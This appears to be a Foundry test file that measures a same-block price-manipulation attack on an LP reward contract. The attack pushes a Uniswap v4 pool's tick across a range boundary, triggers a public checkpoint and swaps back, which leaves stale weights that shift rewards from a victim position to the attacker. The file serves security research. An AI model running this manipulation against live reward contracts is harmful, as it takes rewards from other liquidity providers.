// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity 0.8.28;

import {console2} from "forge-std/console2.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";
import {IPoolManager} from "@uniswap/v4-core/src/interfaces/IPoolManager.sol";
import {StateLibrary} from "@uniswap/v4-core/src/libraries/StateLibrary.sol";
import {FixedPoint96} from "@uniswap/v4-core/src/libraries/FixedPoint96.sol";
import {PoolKey} from "@uniswap/v4-core/src/types/PoolKey.sol";
import {PoolIdLibrary} from "@uniswap/v4-core/src/types/PoolId.sol";
import {Currency} from "@uniswap/v4-core/src/types/Currency.sol";
import {TokenLayerFixture} from "./TokenLayerFixture.sol";

/// @notice Research, not a release gate. A temporary price move, a permissionless checkpoint and a swap back inside
///         one block leave a stale weight in place until the next checkpoint. Baseline and attack start from the same
///         state and rewards are compared after the correction, so what the correction cannot undo is measured.
contract LPWeightManipulationTest is TokenLayerFixture {
    using PoolIdLibrary for PoolKey;
    using StateLibrary for IPoolManager;

    struct Outcome {
        uint256 victimEarned;
        uint256 attackerEarned;
        int256 attackerDelta0;
        int256 attackerDelta1;
        uint256 gasUsed;
    }

    uint128 internal constant NARROW_LIQ = 24e21;
    uint256 internal constant PERIOD = 6 hours;

    bool internal gageIs0;
    uint256 internal unit0;
    uint256 internal unit1;

    function setUp() public override {
        super.setUp();
        gageIs0 = Currency.unwrap(pool.currency0) == address(gage);
        unit0 = gageIs0 ? 1e18 : 1000e18;
        unit1 = gageIs0 ? 1000e18 : 1e18;
    }

    // ----------------------------------------------------------------- scenarios

    function test_reduceOthers_narrowVictimZeroedUntilTheNextCheckpoint() public {
        int24 t = _tick();
        int24 lower = ((t / TICK_SPACING) - 5) * TICK_SPACING;
        int24 upper = ((t / TICK_SPACING) + 6) * TICK_SPACING;
        uint256 victimId = _mint(pool, lower, upper, NARROW_LIQ, lp2, lp2);
        uint256 attackerId = _mintFullRange(pool, LIQ1, lp1, lp1);
        _runMatrix("reduce others", victimId, attackerId, true, lower);
    }

    function test_increaseOwn_outOfRangeAttackerScoresUntilTheNextCheckpoint() public {
        int24 t = _tick();
        int24 lower = ((t / TICK_SPACING) + 2) * TICK_SPACING;
        int24 upper = lower + 10 * TICK_SPACING;
        uint256 attackerId = _mint(pool, lower, upper, NARROW_LIQ, lp1, lp1);
        uint256 victimId = _mintFullRange(pool, LIQ1, lp2, lp2);
        assertEq(lpRewards.positionState(attackerId).weight, 0, "out of range scores nothing");
        _runMatrix("increase own", victimId, attackerId, false, lower);
    }

    function _runMatrix(string memory name, uint256 victimId, uint256 attackerId, bool pushDown, int24 boundary)
        internal
    {
        console2.log("victim weight (GAGE wei)", lpRewards.positionState(victimId).weight);
        console2.log("attacker weight (GAGE wei)", lpRewards.positionState(attackerId).weight);
        console2.log("emission rate (sGAGE wei/s)", _rate0());
        uint256 t0 = block.timestamp;
        uint256 snap = vm.snapshotState();
        Outcome memory base = _baseline(victimId, attackerId);
        uint256[4] memory delays = [uint256(0), 60, 1 hours, 6 hours];
        for (uint256 k; k < delays.length; ++k) {
            vm.revertToState(snap);
            vm.warp(t0);
            Outcome memory atk = _attack(victimId, attackerId, pushDown, boundary, delays[k]);
            _report(name, base, atk, delays[k]);
            if (delays[k] == 0) {
                assertApproxEqRel(
                    atk.victimEarned, base.victimEarned, 5e16, "same-block correction: nothing left behind"
                );
            } else {
                assertLt(atk.victimEarned, base.victimEarned, "victim loses what accrued before the correction");
                assertGt(atk.attackerEarned, base.attackerEarned, "attacker keeps the freed share");
            }
        }
    }

    // ----------------------------------------------------------------- runs

    function _baseline(uint256 victimId, uint256 attackerId) internal returns (Outcome memory o) {
        vm.warp(block.timestamp + PERIOD);
        lpRewards.checkpointMany(_ids(victimId, attackerId));
        (o.victimEarned,) = lpRewards.earned(victimId);
        (o.attackerEarned,) = lpRewards.earned(attackerId);
    }

    /// @dev Real swaps through the PoolManager, a public `checkpointMany`, and the received amount swapped straight
    ///      back. Nobody pokes until `correctionDelay`, then the keeper (or the victim) checkpoints.
    function _attack(uint256 victimId, uint256 attackerId, bool pushDown, int24 boundary, uint256 correctionDelay)
        internal
        returns (Outcome memory o)
    {
        (uint256 b0, uint256 b1) = _bal(lp1);
        o.gasUsed = _manipulate(victimId, attackerId, pushDown, boundary, b0, b1);
        console2.log("  tick restored to", _tick());
        console2.log("  stale victim weight", lpRewards.positionState(victimId).weight);
        console2.log("  stale attacker weight", lpRewards.positionState(attackerId).weight);

        if (correctionDelay > 0) vm.warp(block.timestamp + correctionDelay);
        lpRewards.checkpointMany(_ids(victimId, attackerId));
        vm.warp(block.timestamp + (PERIOD - correctionDelay));
        lpRewards.checkpointMany(_ids(victimId, attackerId));
        (o.victimEarned,) = lpRewards.earned(victimId);
        (o.attackerEarned,) = lpRewards.earned(attackerId);
        _decrease(pool, attackerId, 0, lp1, lp1); // take back the swap fees the attacker's own position earned
        (uint256 e0, uint256 e1) = _bal(lp1);
        o.attackerDelta0 = int256(e0) - int256(b0);
        o.attackerDelta1 = int256(e1) - int256(b1);
    }

    function _manipulate(uint256 victimId, uint256 attackerId, bool pushDown, int24 boundary, uint256 b0, uint256 b1)
        internal
        returns (uint256 gasUsed)
    {
        uint256 g = gasleft();
        _push(pushDown, boundary);
        vm.prank(lp1);
        lpRewards.checkpointMany(_ids(victimId, attackerId));
        (uint256 m0, uint256 m1) = _bal(lp1);
        if (pushDown) _swap(pool, false, -int256(m1 - b1), lp1);
        else _swap(pool, true, -int256(m0 - b0), lp1);
        gasUsed = g - gasleft();
    }

    function _push(bool pushDown, int24 boundary) internal {
        uint256 step = pushDown ? unit0 * 25 : unit1 * 25;
        uint256 i;
        for (; i < 2000; ++i) {
            int24 t = _tick();
            if (pushDown ? t < boundary : t >= boundary) break;
            _swap(pool, pushDown, -int256(step), lp1);
        }
        int24 pushed = _tick();
        require(pushDown ? pushed < boundary : pushed >= boundary, "could not cross");
        console2.log("  swap steps", i);
        console2.log("  tick pushed to", pushed);
    }

    function _report(string memory name, Outcome memory base, Outcome memory atk, uint256 correctionDelay)
        internal
        view
    {
        console2.log("---", name);
        console2.log("  correction after seconds", correctionDelay);
        console2.log("  baseline victim / attacker earned (sGAGE wei)", base.victimEarned, base.attackerEarned);
        console2.log("  attacked victim / attacker earned (sGAGE wei)", atk.victimEarned, atk.attackerEarned);
        uint256 shortfall = base.victimEarned > atk.victimEarned ? base.victimEarned - atk.victimEarned : 0;
        uint256 excess = atk.attackerEarned > base.attackerEarned ? atk.attackerEarned - base.attackerEarned : 0;
        console2.log("  victim shortfall (sGAGE wei)", shortfall);
        console2.log("  attacker excess (sGAGE wei)", excess);
        console2.log("  attacker excess (GAGE wei at pool price)", _sgageToGage(excess));
        console2.log("  attacker swap round trip net of fee income (GAGE wei, signed)");
        console2.logInt(_gageValue(atk.attackerDelta0, atk.attackerDelta1));
        console2.log("  attack gas units", atk.gasUsed);
    }

    // ----------------------------------------------------------------- helpers

    function _tick() internal view returns (int24 t) {
        (, t,,) = poolManager.getSlot0(pool.toId());
    }

    function _bal(address who) internal view returns (uint256 b0, uint256 b1) {
        b0 = IERC20(Currency.unwrap(pool.currency0)).balanceOf(who);
        b1 = IERC20(Currency.unwrap(pool.currency1)).balanceOf(who);
    }

    function _sgageToGage(uint256 s) internal view returns (uint256) {
        (uint160 sqrtP,,,) = poolManager.getSlot0(pool.toId());
        return gageIs0
            ? Math.mulDiv(Math.mulDiv(s, FixedPoint96.Q96, sqrtP), FixedPoint96.Q96, sqrtP)
            : Math.mulDiv(Math.mulDiv(s, sqrtP, FixedPoint96.Q96), sqrtP, FixedPoint96.Q96);
    }

    function _gageValue(int256 d0, int256 d1) internal view returns (int256) {
        int256 gageSide = gageIs0 ? d0 : d1;
        int256 other = gageIs0 ? d1 : d0;
        uint256 conv = _sgageToGage(uint256(other < 0 ? -other : other));
        return gageSide + (other < 0 ? -int256(conv) : int256(conv));
    }

    function _ids(uint256 a, uint256 b) internal pure returns (uint256[] memory ids) {
        ids = new uint256[](2);
        ids[0] = a;
        ids[1] = b;
    }
}
